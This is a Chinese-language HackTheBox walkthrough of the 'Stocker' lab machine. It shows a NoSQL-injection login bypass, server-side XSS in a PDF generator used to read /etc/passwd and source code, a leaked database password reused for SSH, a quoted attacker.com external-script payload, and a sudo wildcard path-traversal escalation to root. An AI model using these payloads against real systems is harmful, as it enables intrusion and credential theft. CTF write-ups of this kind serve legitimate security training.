---
tags:
  - HTB/Linux
  - HTB/Easy
---

**Waiting for machine retire...**


---

## 扫描

将自己侦查时常用的命令写了个脚本：[工作流](./HTB-Busqueda.md#workflow-scan)

- 22/tcp open  ssh &nbsp; &nbsp; &nbsp; &nbsp; OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
- 80/tcp open  http &nbsp; &nbsp; &nbsp; nginx 1.18.0 (Ubuntu)

## 漏洞分析

### 80端口

- robots.txt：无
- 网页信息
    - staff：**Angoose Garden**, Head of IT at Stockers Ltd.
    - Made by templatedeck.com
- 网页功能：无发现
- 网页源码：无发现
- 子域枚举
    - > Found: dev.stocker.htb Status: 302 [Size: 28] [--> /login]
- 目录枚举：由于发现子域，且是个登陆界面，所以似乎并不需要

#### 子域：dev.stocker.htb

将其加入hosts文件后访问，是个登陆界面。  
稍微试了下SQLi似乎不行。

- 网页源码
    - Hugo 0.84.0（搜了下似乎没漏洞）
    - bootstrap@5.0.2
    - name="username" placeholder="jsmith"
    - name="password" placeholder="Password"
- 目录枚举
    - > /stock &nbsp; &nbsp; &nbsp; &nbsp; (Status: 302) [Size: 48] [--> /login?error=auth-required]

感觉突破口就在登陆界面了……又试了下placeholder那里写的账号密码，登陆失败。

注意到我们多次请求的cookie值是固定的，那尝试用sqlmap跑一下吧。  
```http
└─$ cat login-post.txt        
POST /login HTTP/1.1
Host: dev.stocker.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Origin: http://dev.stocker.htb
Connection: close
Referer: http://dev.stocker.htb/login
Cookie: connect.sid=s%3AqGZ3cfqla8iZ8Z0kCgb0XFSH8yU28ZmZ.DHCZS1Pt2nPi34yO9KLryJeTtuIHKbjeBTVSVWxiCGs
Upgrade-Insecure-Requests: 1

username=admin&password=admin 
```

试了这两种语法都没结果……
```bash
└─$ sqlmap -r login-post.txt -p username

└─$ sqlmap -u 'http://dev.stocker.htb/login' --cookie='s%3AqGZ3cfqla8iZ8Z0kCgb0XFSH8yU28ZmZ.DHCZS1Pt2nPi34yO9KLryJeTtuIHKbjeBTVSVWxiCGs' --data 'username=admin&password=admin' -p "username,password" --method POST
```
 
*后来了解到似乎sqlmap似乎不能测试NoSQLi？而对于NoSQLi另有个[NoSQLMap](https://github.com/codingo/NoSQLMap) 0.0*  
*不懂了……然后看了眼官方论坛说[IppSec解说的Shoppy](https://www.youtube.com/watch?v=AJc53DUdt1M&t=220s)十分具有参考性 0.0*

根据[IppSec解说的Shoppy](https://www.youtube.com/watch?v=AJc53DUdt1M&t=220s)，看了眼wappalyzer插件，发现**运行Node.js应用，以及Express框架**。  
这里似乎是一样的情况，[NoSQLi](https://book.hacktricks.xyz/pentesting-web/nosql-injection#basic-authentication-bypass)

顺便记录几个知识点：

- `username[$ne]=toto&password[$ne]=toto` 这种在username用数组的，或者就单纯是字符串(scalar)的，一般是PHP、Apache
- 而npm服务器、Node.js就一般将报头 `Content-Type` 的 `application/x-www-form-urlencoded` 改为 `application/json`，然后用json格式的payload：`{"username": {"$ne": null}, "password": {"$ne": null} }`
    - 也可在改完报头后，先试试请求正常的json数据，或者少放一个json值，确认一下服务器是否解析json

#### NoSQLi绕过登陆

根据上述操作，看Burp的响应似乎是成功了：
```http
HTTP/1.1 302 Found
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 27 May 2023 14:44:49 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 56
Connection: close
X-Powered-By: Express
Location: /stock
Vary: Accept

<p>Found. Redirecting to <a href="/stock">/stock</a></p>
```

绕过登陆后会重定向到"/stock"，这个目录我们之前也枚举到过。  
而由于cookie值固定，我们现在应该算是已登录的状态了。  
用浏览器访问一下 `http://dev.stocker.htb/stock`，成功进入：  
![HTB-Stockers-login](./evidence-img/HTB-Stockers-login.png)


#### 拦截、修改订单请求发现注入点

进入`/stock` 界面后，随便点点，发现似乎就是一个购物页面。发送订单之后会给你一个链接，点开就是刚刚买东西的订单？  
再看看Burp的请求，似乎Item那里的值就是请求里title的值：  
![HTB-Stockers-purchase](./evidence-img/HTB-Stockers-purchase.png)

尝试Burp拦截请求，将“Cup”改为“/etc/passwd”看看结果。的确Item值有变化：  
![HTB-Stockers-edit_req](./evidence-img/HTB-Stockers-edit_req.png)

不过光显示“/etc/passwd”没啥意义啊……

#### 下载、分析pdf订单

而这个订单，似乎是个pdf文件，先下载下来，然后用 `exiftool` 看看有什么信息：
```bash
└─$ exiftool document.pdf        
ExifTool Version Number         : 12.44
File Name                       : document.pdf
Directory                       : .
File Size                       : 40 kB
File Modification Date/Time     : 2023:05:27 22:33:09-04:00
File Access Date/Time           : 2023:05:27 22:33:09-04:00
File Inode Change Date/Time     : 2023:05:27 22:33:51-04:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Page Count                      : 1
Tagged PDF                      : Yes
Creator                         : Chromium
Producer                        : Skia/PDF m108
Create Date                     : 2023:05:28 02:32:30+00:00
Modify Date                     : 2023:05:28 02:32:30+00:00
```

这个PDF文件应该是由“Skia/PDF m108”生成的。

#### 动态PDF的XSS

谷歌一下 `Skia/PDF m108`，发现有[hacktricks](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf)关于动态PDF的利用。

另外还能找到这两篇文章学习一下：  
> <https://www.triskelelabs.com/microstrategy-ssrf-through-pdf-generator-cve-2020-24815>  
> <https://www.triskelelabs.com/blog/extracting-your-aws-access-keys-through-a-pdf-file>

```html
<script>document.write(JSON.stringify(window.location))</script>
```

将上面的payload放到Item的值，注入有效：  
![HTB-Stockers-pdf](./evidence-img/HTB-Stockers-pdf.png)

*一开始尝试 `<img src="x" onerror="document.write('test')" />` 不行，还想着估计有双引号的payload都不行。后来试了下只要把双引号转义一下就行：`<img src=\"x\" onerror=\"document.write('test')\" />`*

再看看hacktricks里面有什么利用方式。

- 既然双引号不是问题了，那先试试[这里的第一个payload](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf#read-local-file)获取 /etc/passwd。不过结果是订单文件显示了一行一长串的字符，似乎还因为太长了一行还显示不全……
- `<iframe src=file:///etc/passwd></iframe>` 这个payload倒是可以正常显示，不过只显示了前面几行。尝试更改一下iframe的大小 `<iframe src=file:///etc/passwd width='1000' height='1000'></iframe>`，获得了服务器的用户列表：

        root:x:0:0:root:/root:/bin/bash
        daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
        bin:x:2:2:bin:/bin:/usr/sbin/nologin
        sys:x:3:3:sys:/dev:/usr/sbin/nologin
        sync:x:4:65534:sync:/bin:/bin/sync
        games:x:5:60:games:/usr/games:/usr/sbin/nologin
        man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
        lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
        mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
        news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
        uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
        proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
        www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
        backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
        list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
        irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
        gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
        nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
        systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
        systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
        systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
        messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
        syslog:x:104:110::/home/syslog:/usr/sbin/nologin
        _apt:x:105:65534::/nonexistent:/usr/sbin/nologin
        tss:x:106:112:TPM software stack,,,:/var/lib/tpm:/bin/false
        uuidd:x:107:113::/run/uuidd:/usr/sbin/nologin
        tcpdump:x:108:114::/nonexistent:/usr/sbin/nologin
        landscape:x:109:116::/var/lib/landscape:/usr/sbin/nologin
        pollinate:x:110:1::/var/cache/pollinate:/bin/false
        sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
        systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
        fwupd-refresh:x:112:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
        mongodb:x:113:65534::/home/mongodb:/usr/sbin/nologin
        angoose:x:1001:1001:,,,:/home/angoose:/bin/bash
        _laurel:x:998:998::/var/log/laurel:/bin/false


几个值得关注的地方：

- 数据库：mongodb
- id大于1000用户：angoose
- 开的服务还挺多，其他靶机都没怎么见到mail、proxy什么的

试了下获取shadow失败，获取用户angoose的SSH密钥也失败，感觉也走不通了。

##### 加载外部脚本

根据[hacktricks](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf#load-an-external-script)的payload `<script src="http://attacker.com/myscripts.js"></script>`，尝试一下加载外部脚本。

首先验证是否可行：
```bash
└─$ ls
test.txt

└─$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.196 - - [27/May/2023 23:39:46] "GET /test.txt HTTP/1.1" 200 -
```

OK，那就写个反弹shell……  
不过尝试之后，发现的确有获取我的脚本，但是大概是没有执行？拿不到shell……

## Initial Access

看了眼官方论坛，说可以看看 `/var/www/dev/index.js` 这个文件？不知道怎么知道要找这个文件的……

*后来翻找WP，看到[这篇](https://blog.213.se/stocker-hackthebox/)解释得很详细。原来是需要一点Node.js的知识啊，要了解这个项目的架构。*  
*之前用[第一个XSS的payload](./HTB-Stocker.md#pdfxss)时我们知道订单文档的路径是在 `/var/www/dev/pos/` 下面，谁知道这个“dev”就是子域这个dev啊……以及 `index.js` 这个文件较重要。*

根据提示，发送payload `<iframe src=file:///var/www/dev/index.js width='1000' height='1000'></iframe>`后，获得 `/var/www/dev/index.js` 文件下的密码：
```bash
const express = require("express");
const mongoose = require("mongoose");
const session = require("express-session");
const MongoStore = require("connect-mongo");
const path = require("path");
const fs = require("fs");
const { generatePDF, formatHTML } = require("./pdf.js");
const { randomBytes, createHash } = require("crypto");
const app = express();
const port = 3000;
// TODO: Configure loading from dotenv for production
const dbURI = "mongodb://dev:IHeardPassphrasesArePrettySecure@localhost/dev?authSource=admin&w=1";
```

要不是论坛里也直接说了这是用户angoose的密码，我还以为是dev的呢……不过passwd里倒是也没有dev用户，也只有angoose最值得一试了……


## flag: user

SSH连接后，获得用户flag：

```
└─$ ssh angoose@10.10.11.196
……
Last login: Sat May 27 18:56:20 2023 from 10.10.14.8
angoose@stocker:~$ id
uid=1001(angoose) gid=1001(angoose) groups=1001(angoose)
angoose@stocker:~$ ls
exploit.js  user.txt
angoose@stocker:~$ cat user.txt 
e014……850c
```


## Privilege Escalation

知道当前用户的密码，所以先看看 `sudo -l`：
```bash
angoose@stocker:~$ sudo -l
[sudo] password for angoose: 
Matching Defaults entries for angoose on stocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User angoose may run the following commands on stocker:
    (ALL) /usr/bin/node /usr/local/scripts/*.js
```

可以执行.js脚本，虽然看上去指定了目录，不过由于通配符，我们可以自由控制目录移动。

唔……不太会js的脚本。  
不过实际上，刚登入SSH看当前目录的文件时就发现一个 `exploit.js`：
```bash
angoose@stocker:~$ cat exploit.js 
const fs = require('fs');
fs.readFile('/root/root.txt', 'utf8', (err, data) => {
 if (err) throw err;
 console.log(data);
});
```

应该是之前的玩家留下的，用了用了！


## flag: root

```bash
angoose@stocker:~$ sudo /usr/bin/node /usr/local/scripts/../../../home/angoose/exploit.js 
[sudo] password for angoose: 
a6c0……e3b1
```

---

## 总结·后记

2023/05/28

……

完全是js系列的靶机